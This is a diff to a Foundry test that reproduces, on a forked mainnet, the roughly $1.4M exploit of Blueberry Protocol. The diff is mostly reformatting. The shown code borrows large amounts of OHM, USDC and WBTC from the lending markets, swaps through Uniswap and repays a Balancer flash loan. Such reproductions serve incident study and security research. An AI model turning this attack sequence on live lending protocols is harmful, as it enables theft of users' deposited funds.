@@ -1,5 +1,12 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IWETH} from "src/interfaces/IWETH.sol";
+import {IBalancerVault} from "src/interfaces/IBalancerVault.sol";
+import {IUniswapV3Router} from "src/interfaces/IUniswapV3Router.sol";
 // @KeyInfo - Total Lost : ~$1,400,000 USD
 // Attacker : https://etherscan.io/address/0xc0ffeebabe5d496b2dde509f9fa189c25cf29671 (whitehat)
 // Attack Contract : https://etherscan.io/address/0x3aa228a80f50763045bdfc45012da124bd0a6809
@@ -13,13 +20,12 @@ import "forge-std/Test.sol";
 // https://twitter.com/blueberryFDN/status/1760865357236211964
 
 interface IMarketFacet {
-
-    function enterMarkets(address[] calldata vTokens) external returns (uint256[] memory);
-
+    function enterMarkets(
+        address[] calldata vTokens
+    ) external returns (uint256[] memory);
 }
 
 interface bBep20Interface {
-
     function transfer(address dst, uint256 amount) external returns (bool);
 
     function approve(address spender, uint256 amount) external returns (bool);
@@ -32,26 +38,31 @@ interface bBep20Interface {
     function mint(uint256 mintAmount) external returns (uint256);
 
     function borrow(uint256 borrowAmount) external returns (uint256);
-
 }
 
 contract ContractTest is Test {
-
     IWETH private WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 private OHM = IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);
     IERC20 private USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 private WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
 
-    bBep20Interface private bWETH = bBep20Interface(0x643d448CEa0D3616F0b32E3718F563b164e7eDd2);
-    bBep20Interface private bOHM = bBep20Interface(0x08830038A6097C10f4A814274d5A68E64648d91c);
-    bBep20Interface private bUSDC = bBep20Interface(0x649127D0800a8c68290129F091564aD2F1D62De1);
-    bBep20Interface private bWBTC = bBep20Interface(0xE61ad5B0E40c856E6C193120Bd3fa28A432911B6);
+    bBep20Interface private bWETH =
+        bBep20Interface(0x643d448CEa0D3616F0b32E3718F563b164e7eDd2);
+    bBep20Interface private bOHM =
+        bBep20Interface(0x08830038A6097C10f4A814274d5A68E64648d91c);
+    bBep20Interface private bUSDC =
+        bBep20Interface(0x649127D0800a8c68290129F091564aD2F1D62De1);
+    bBep20Interface private bWBTC =
+        bBep20Interface(0xE61ad5B0E40c856E6C193120Bd3fa28A432911B6);
 
-    IMarketFacet BlueberryProtocol = IMarketFacet(0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2);
+    IMarketFacet BlueberryProtocol =
+        IMarketFacet(0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2);
 
-    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IBalancerVault balancer =
+        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
 
-    IUniswapV3Router pool = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    IUniswapV3Router pool =
+        IUniswapV3Router(payable(0xE592427A0AEce92De3Edee1F18E0157C05861564));
 
     function setUp() public {
         vm.createSelectFork("mainnet", 19_287_289 - 1);
@@ -100,21 +111,21 @@ contract ContractTest is Test {
         bOHM.borrow(8_616_071_267_266);
         bUSDC.borrow(913_262_603_416);
         bWBTC.borrow(686_690_100);
-        IUniswapV3Router.ExactOutputSingleParams memory params = IUniswapV3Router.ExactOutputSingleParams({
-            tokenIn: address(OHM),
-            tokenOut: address(WETH),
-            fee: 3000,
-            recipient: address(this),
-            deadline: type(uint256).max,
-            amountOut: 999_999_999_999_999_999,
-            amountInMaximum: type(uint256).max,
-            sqrtPriceLimitX96: 0
-        });
+        IUniswapV3Router.ExactOutputSingleParams
+            memory params = IUniswapV3Router.ExactOutputSingleParams({
+                tokenIn: address(OHM),
+                tokenOut: address(WETH),
+                fee: 3000,
+                recipient: address(this),
+                deadline: type(uint256).max,
+                amountOut: 999_999_999_999_999_999,
+                amountInMaximum: type(uint256).max,
+                sqrtPriceLimitX96: 0
+            });
         pool.exactOutputSingle(params);
         WETH.transfer(address(balancer), 1_000_000_000_000_000_000);
     }
 
     receive() external payable {}
     fallback() external payable {}
-
 }
